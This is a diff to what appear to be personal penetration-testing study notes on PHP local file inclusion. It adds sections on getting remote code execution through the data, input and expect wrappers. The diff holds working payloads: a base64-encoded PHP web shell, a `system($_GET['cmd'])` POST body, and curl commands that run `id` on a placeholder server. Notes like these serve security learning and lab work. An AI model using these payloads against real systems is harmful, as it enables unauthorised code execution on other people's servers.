@@ -124,7 +124,8 @@ There is four types of filters available to us here: [String Filters](https://ww
 
 The first step is to [[ffuf#Page Fuzzing|fuzz]] for php files that we might want to read, we aren't limited to ones that return a `200` too, so `301`, `302`, and `403` are all valid codes to look for. Once we have a list of files we want to view, we can use `php://filter/read=convert.base64-encode/resource=config.php` (*for `config.php`*). This may need to be modified (eg. remove the extension) if there are other filtering protections in place.
 
-## RCE Through LFI
+## LFI RCE with PHP Wrappers
+### Data Wrapper
 The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to load external data, including PHP code. Like many other LFI attacks, this wrapper is only available if the `allow_url_include` setting is enabled in the PHP configuration (*This is NOT enabled by default*). To check this we can use LFI to include the PHP config file (Apache2: `/etc/php/[version X.Y]/apache2/php.ini`, Nginx: `/etc/php/[version X.Y]/fpm/php.ini`). We can iterate through the PHP version until we find the correct one. 
 > We should also use the `convert.base64-encode` filter as the `.ini` file should be encoded when sent. We can then decode to see if the setting is enabled.
 
@@ -136,4 +137,17 @@ PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 Then upload it via an LFI attack:
 ```bash
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
+
+### Input Wrapper
+The [input](https://www.php.net/manual/en/wrappers.php.php), similar to the [[#Data Wrapper]], also requires `allow_url_include` to be enabled. However, this wrapper relies on the POST method so the vulnerable parameter must accept POST requests. We sent the payload in the POST request's data and point the vulnerable parameter to `php://input`.
+```bash
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+> This relies on the vulnerable function also accepting GET requests, if it only accepts post requests then we can just include the command in the PHP code itself `<\?php system('id'); ?>`.
+
+### Expect Wrapper
+The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams, it is designed to execute commands. However, its an external wrapper so it has to have been installed manually and enabled on the back-end server (*so its very rare we will see this in the wild*). Just like we checked for if the `allow_url_include` in the [[#Data Wrapper]] we can do the same process but grep for `expect` instead to determine if its installed (*we'd want `extension=expect`*).
+```bash
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 ```
